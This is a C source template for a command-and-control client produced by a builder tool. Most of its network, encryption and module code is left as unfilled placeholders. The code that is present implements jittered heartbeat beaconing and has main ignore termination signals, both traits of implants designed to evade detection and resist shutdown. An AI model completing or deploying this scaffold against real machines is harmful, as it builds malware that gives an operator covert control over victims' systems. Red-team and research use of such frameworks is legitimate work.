/**
 * @file client.c
 * @brief C2 client implementation
 * @generated Generated by DinoC Builder Tool v{{BUILDER_VERSION}}
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

// Configuration
#define CLIENT_VERSION_MAJOR {{VERSION_MAJOR}}
#define CLIENT_VERSION_MINOR {{VERSION_MINOR}}
#define CLIENT_VERSION_PATCH {{VERSION_PATCH}}
#define CLIENT_DEBUG_MODE {{DEBUG_MODE}}

// Protocol definitions
{{PROTOCOL_DEFINITIONS}}

// Server definitions
{{SERVER_DEFINITIONS}}

// Domain definition
{{DOMAIN_DEFINITION}}

// Encryption algorithm
{{ENCRYPTION_DEFINITION}}

// Heartbeat configuration
#define HEARTBEAT_INTERVAL {{HEARTBEAT_INTERVAL}}
#define HEARTBEAT_JITTER {{HEARTBEAT_JITTER}}

// Module definitions
{{MODULE_DEFINITIONS}}

// Client state
static int client_initialized = 0;
static int client_connected = 0;
static int current_protocol = {{DEFAULT_PROTOCOL}};
static time_t last_heartbeat_time = 0;
static pthread_t heartbeat_thread;
static int heartbeat_thread_running = 0;
static pthread_mutex_t heartbeat_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t heartbeat_cond = PTHREAD_COND_INITIALIZER;

// Forward declarations
static void* client_heartbeat_thread(void* arg);
static int client_connect_with_protocol(int protocol_type);
{{MODULE_FORWARD_DECLARATIONS}}

/**
 * @brief Initialize client
 */
int client_init(void) {
    // Check if already initialized
    if (client_initialized) {
        return -1;
    }
    
    // Initialize random seed
    srand(time(NULL));
    
    // Set initialized flag
    client_initialized = 1;
    
    #if CLIENT_DEBUG_MODE
    printf("[DEBUG] Client initialized (v%d.%d.%d)\n", 
           CLIENT_VERSION_MAJOR, CLIENT_VERSION_MINOR, CLIENT_VERSION_PATCH);
    #endif
    
    return 0;
}

/**
 * @brief Shutdown client
 */
int client_shutdown(void) {
    // Check if initialized
    if (!client_initialized) {
        return -1;
    }
    
    // Disconnect if connected
    if (client_connected) {
        client_disconnect();
    }
    
    // Reset state
    client_initialized = 0;
    
    #if CLIENT_DEBUG_MODE
    printf("[DEBUG] Client shutdown\n");
    #endif
    
    return 0;
}

/**
 * @brief Connect to server
 */
int client_connect(void) {
    // Check if initialized
    if (!client_initialized) {
        return -1;
    }
    
    // Check if already connected
    if (client_connected) {
        return -1;
    }
    
    // Connect with current protocol
    int status = client_connect_with_protocol(current_protocol);
    
    if (status != 0) {
        // Try other protocols
        {{PROTOCOL_FALLBACK_CODE}}
    }
    
    if (status != 0) {
        return status;
    }
    
    // Start heartbeat thread
    heartbeat_thread_running = 1;
    if (pthread_create(&heartbeat_thread, NULL, &client_heartbeat_thread, NULL) != 0) {
        client_connected = 0;
        return -1;
    }
    
    return 0;
}

/**
 * @brief Disconnect from server
 */
int client_disconnect(void) {
    // Check if initialized
    if (!client_initialized) {
        return -1;
    }
    
    // Check if connected
    if (!client_connected) {
        return -1;
    }
    
    // Stop heartbeat thread
    pthread_mutex_lock(&heartbeat_mutex);
    heartbeat_thread_running = 0;
    pthread_cond_signal(&heartbeat_cond);
    pthread_mutex_unlock(&heartbeat_mutex);
    
    pthread_join(heartbeat_thread, NULL);
    
    // Reset state
    client_connected = 0;
    
    #if CLIENT_DEBUG_MODE
    printf("[DEBUG] Client disconnected\n");
    #endif
    
    return 0;
}

/**
 * @brief Send heartbeat to server
 */
int client_send_heartbeat(void) {
    // Check if initialized
    if (!client_initialized) {
        return -1;
    }
    
    // Check if connected
    if (!client_connected) {
        return -1;
    }
    
    // Update last heartbeat time
    time(&last_heartbeat_time);
    
    #if CLIENT_DEBUG_MODE
    printf("[DEBUG] Heartbeat sent\n");
    #endif
    
    // TODO: Implement actual heartbeat sending based on protocol
    {{HEARTBEAT_IMPLEMENTATION}}
    
    return 0;
}

/**
 * @brief Switch to a different protocol
 */
int client_switch_protocol(int protocol_type) {
    // Check if initialized
    if (!client_initialized) {
        return -1;
    }
    
    // Check if protocol is supported
    int protocol_supported = 0;
    {{PROTOCOL_SUPPORT_CHECK}}
    
    if (!protocol_supported) {
        return -1;
    }
    
    // If already using this protocol, do nothing
    if (current_protocol == protocol_type) {
        return 0;
    }
    
    // If connected, disconnect first
    int was_connected = client_connected;
    if (was_connected) {
        client_disconnect();
    }
    
    // Switch protocol
    current_protocol = protocol_type;
    
    #if CLIENT_DEBUG_MODE
    printf("[DEBUG] Switched to protocol %d\n", protocol_type);
    #endif
    
    // Reconnect if needed
    if (was_connected) {
        return client_connect();
    }
    
    return 0;
}

{{MODULE_IMPLEMENTATIONS}}

/**
 * @brief Connect with a specific protocol
 */
static int client_connect_with_protocol(int protocol_type) {
    #if CLIENT_DEBUG_MODE
    printf("[DEBUG] Connecting with protocol %d\n", protocol_type);
    #endif
    
    // Implement protocol-specific connection
    {{PROTOCOL_CONNECTION_IMPLEMENTATIONS}}
    
    // If we reach here, connection failed
    return -1;
}

/**
 * @brief Heartbeat thread function
 */
static void* client_heartbeat_thread(void* arg) {
    struct timespec ts;
    
    while (1) {
        // Wait for condition or timeout
        pthread_mutex_lock(&heartbeat_mutex);
        
        if (!heartbeat_thread_running) {
            pthread_mutex_unlock(&heartbeat_mutex);
            break;
        }
        
        // Calculate next heartbeat time with jitter
        time_t now;
        time(&now);
        
        // Add random jitter
        int jitter = 0;
        if (HEARTBEAT_JITTER > 0) {
            jitter = rand() % (2 * HEARTBEAT_JITTER) - HEARTBEAT_JITTER;
        }
        
        // Calculate next heartbeat time
        time_t next_heartbeat = last_heartbeat_time + HEARTBEAT_INTERVAL + jitter;
        
        // If next heartbeat is in the past, send heartbeat immediately
        if (next_heartbeat <= now) {
            pthread_mutex_unlock(&heartbeat_mutex);
            client_send_heartbeat();
            continue;
        }
        
        // Wait until next heartbeat
        ts.tv_sec = next_heartbeat;
        ts.tv_nsec = 0;
        
        pthread_cond_timedwait(&heartbeat_cond, &heartbeat_mutex, &ts);
        
        if (!heartbeat_thread_running) {
            pthread_mutex_unlock(&heartbeat_mutex);
            break;
        }
        
        pthread_mutex_unlock(&heartbeat_mutex);
        
        // Send heartbeat
        client_send_heartbeat();
    }
    
    return NULL;
}

/**
 * @brief Main function
 */
int main(int argc, char** argv) {
    // Set signal handlers
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    
    // Initialize client
    if (client_init() != 0) {
        fprintf(stderr, "Failed to initialize client\n");
        return 1;
    }
    
    // Connect to server
    if (client_connect() != 0) {
        fprintf(stderr, "Failed to connect to server\n");
        client_shutdown();
        return 1;
    }
    
    // Main loop
    while (client_connected) {
        sleep(1);
    }
    
    // Shutdown client
    client_shutdown();
    
    return 0;
}
